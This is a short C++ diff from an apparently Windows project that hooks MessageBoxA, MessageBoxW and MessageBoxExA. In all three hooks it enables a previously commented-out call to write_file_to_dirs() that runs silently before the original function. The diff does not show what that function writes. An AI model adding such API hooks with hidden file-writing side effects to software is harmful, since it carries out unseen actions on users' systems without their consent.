@@ -101,7 +101,7 @@ int WINAPI messageBoxAHook::hookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR l
     MessageBoxAType originalMessageBoxA = MessageBoxA;
     Main Main{};
     // cout << "Hooked to MessageBoxA" << endl;
-    // write_file_to_dirs();
+    write_file_to_dirs();
     Main.Windows();
     // Call the original MessageBoxA function
     return originalMessageBoxA(hWnd, lpText, lpCaption, uType);
@@ -116,7 +116,7 @@ int WINAPI messageBoxAHook::hookedMessageBoxW(HWND hWnd, LPCWSTR lpText, LPCWSTR
     MessageBoxWType originalMessageBoxW = MessageBoxW;
     Main Main{};
 
-    // write_file_to_dirs();
+    write_file_to_dirs();
     Main.Windows();
     // Call the original MessageBoxW function
     return originalMessageBoxW(hWnd, lpText, lpCaption, uType);
@@ -129,7 +129,7 @@ int messageBoxAHook::hookedMessageBoxExA(HWND hWnd, LPCSTR lpText, LPCSTR lpCapt
 
     Main Main{};
     // cout << "Hooked to MessageBoxExA" << endl;
-    // write_file_to_dirs();
+     write_file_to_dirs();
     Main.Windows();
     return originalMessageBoxExA(hWnd,lpText,lpCaption,uType,wLanguageId);
 };
